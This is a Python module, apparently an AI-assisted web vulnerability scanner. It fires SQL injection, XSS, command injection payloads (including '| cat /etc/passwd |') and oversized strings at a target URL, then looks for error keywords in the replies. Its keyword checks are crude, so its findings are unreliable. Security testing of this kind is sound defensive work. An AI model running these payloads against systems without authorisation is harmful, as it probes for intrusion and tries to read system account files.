"""
Key Improvements Explained:
Retry Strategy:
A Retry object is configured to retry up to 3 times on common error statuses. This helps in situations where a timeout might be transient.

Increased Timeout:
The default timeout for each request is now 10 seconds, giving slower servers more time to respond.

Specific Exception Handling:
Read timeouts are caught separately (using requests.exceptions.ReadTimeout), making it easier to debug and log specific issues with server response delays.

These enhancements should reduce the number of errors due to timeouts and make your vulnerability scans more robust. Let me know if you need any further improvements!
"""
import requests
import logging
import urllib.parse
from requests.adapters import HTTPAdapter
from urllib3.util import Retry

# Configure logging for the vulnerability_scanner module
logger = logging.getLogger("vulnerability_scanner")
logger.setLevel(logging.DEBUG)
console_handler = logging.StreamHandler()
formatter = logging.Formatter('%(asctime)s - vulnerability_scanner - %(levelname)s - %(message)s')
console_handler.setFormatter(formatter)
logger.addHandler(console_handler)

# Set up a session with a retry strategy to handle transient errors
retry_strategy = Retry(
    total=3,
    status_forcelist=[429, 500, 502, 503, 504],
    allowed_methods=["HEAD", "GET", "OPTIONS"],
    backoff_factor=1
)
adapter = HTTPAdapter(max_retries=retry_strategy)
session = requests.Session()
session.mount("http://", adapter)
session.mount("https://", adapter)

DEFAULT_TIMEOUT = 10  # increased timeout from 5 to 10 seconds


def sql_injection_test(url):
    """
    Enhanced SQL injection test that iterates over multiple common vulnerable parameters and payloads.
    It checks for a robust set of SQL error-related keywords and includes additional payload variations.
    """
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' -- ",
        "' OR 1=1 --",
        "' OR '1'='1' /*",
        "\" OR \"1\"=\"1",
        "\" OR \"1\"=\"1\" -- ",
        "\" OR 1=1 --"
    ]
    parameters = ["id", "user", "item"]
    sql_error_keywords = [
        "sql syntax", "mysql", "syntax error", "sql error", "odbc", "warning:", "unclosed quotation mark"
    ]
    vulnerabilities = []
    for param in parameters:
        for payload in payloads:
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{url}?{param}={encoded_payload}"
            logger.info("Testing SQL injection on %s", test_url)
            try:
                response = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                if response.status_code == 200:
                    lower_response = response.text.lower()
                    if any(keyword in lower_response for keyword in sql_error_keywords):
                        msg = f"Potential SQL injection vulnerability found at {test_url}"
                        logger.warning(msg)
                        vulnerabilities.append(msg)
                        break  # Stop trying payloads for this parameter if vulnerability is detected.
            except requests.exceptions.ReadTimeout as e:
                logger.error("Read timeout during SQL injection test on %s: %s", test_url, e)
            except Exception as e:
                logger.error("Error during SQL injection test on %s: %s", test_url, e)
    if vulnerabilities:
        return "\n".join(vulnerabilities)
    else:
        msg = "No SQL injection vulnerability detected."
        logger.info(msg)
        return msg


def xss_test(url):
    """
    Enhanced XSS test that iterates over multiple payloads.
    Verifies if the payload is reflected unescaped in the response.
    """
    payloads = [
        "<script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>"
    ]
    param = "search"
    vulnerabilities = []
    for payload in payloads:
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{url}?{param}={encoded_payload}"
        logger.info("Testing XSS on %s", test_url)
        try:
            response = session.get(test_url, timeout=DEFAULT_TIMEOUT)
            if response.status_code == 200:
                if payload in response.text:
                    msg = f"Potential XSS vulnerability found at {test_url}"
                    logger.warning(msg)
                    vulnerabilities.append(msg)
                    break  # Stop if vulnerability detected.
        except requests.exceptions.ReadTimeout as e:
            logger.error("Read timeout during XSS test on %s: %s", test_url, e)
        except Exception as e:
            logger.error("Error during XSS test on %s: %s", test_url, e)
    if vulnerabilities:
        return "\n".join(vulnerabilities)
    else:
        msg = "No XSS vulnerability detected."
        logger.info(msg)
        return msg


def command_injection_test(url):
    """
    Enhanced command injection test by trying multiple payloads to reveal server OS information.
    Checks for various OS-related keywords that might indicate successful injection.
    """
    payloads = [
        "|| uname -a ||",
        "&& uname -a &&",
        "| cat /etc/passwd |"
    ]
    param = "cmd"
    vulnerabilities = []
    os_keywords = ["linux", "unix", "windows", "darwin"]
    for payload in payloads:
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{url}?{param}={encoded_payload}"
        logger.info("Testing Command Injection on %s", test_url)
        try:
            response = session.get(test_url, timeout=DEFAULT_TIMEOUT)
            if response.status_code == 200:
                lower_response = response.text.lower()
                if any(keyword in lower_response for keyword in os_keywords):
                    msg = f"Potential command injection vulnerability found at {test_url}"
                    logger.warning(msg)
                    vulnerabilities.append(msg)
                    break
        except requests.exceptions.ReadTimeout as e:
            logger.error("Read timeout during command injection test on %s: %s", test_url, e)
        except Exception as e:
            logger.error("Error during command injection test on %s: %s", test_url, e)
    if vulnerabilities:
        return "\n".join(vulnerabilities)
    else:
        msg = "No command injection vulnerability detected."
        logger.info(msg)
        return msg


def buffer_overflow_test(url):
    """
    Enhanced simulated buffer overflow test.
    Sends unusually large payloads and checks for error messages indicative of overflow conditions.
    Note: This is a simulated test and real buffer overflow exploits require controlled environments.
    """
    payloads = [
        "A" * 5000,
        "A" * 10000
    ]
    param = "data"
    vulnerabilities = []
    error_keywords = ["error", "exception", "segmentation fault", "stack smashing", "buffer overflow"]
    for payload in payloads:
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{url}?{param}={encoded_payload}"
        logger.info("Testing Buffer Overflow on %s", test_url)
        try:
            response = session.get(test_url, timeout=DEFAULT_TIMEOUT)
            if response.status_code == 200:
                lower_response = response.text.lower()
                if any(keyword in lower_response for keyword in error_keywords):
                    msg = f"Potential buffer overflow vulnerability detected at {test_url}"
                    logger.warning(msg)
                    vulnerabilities.append(msg)
                    break
        except requests.exceptions.ReadTimeout as e:
            logger.error("Read timeout during buffer overflow test on %s: %s", test_url, e)
        except Exception as e:
            logger.error("Error during buffer overflow test on %s: %s", test_url, e)
    if vulnerabilities:
        return "\n".join(vulnerabilities)
    else:
        msg = "No buffer overflow vulnerability detected."
        logger.info(msg)
        return msg
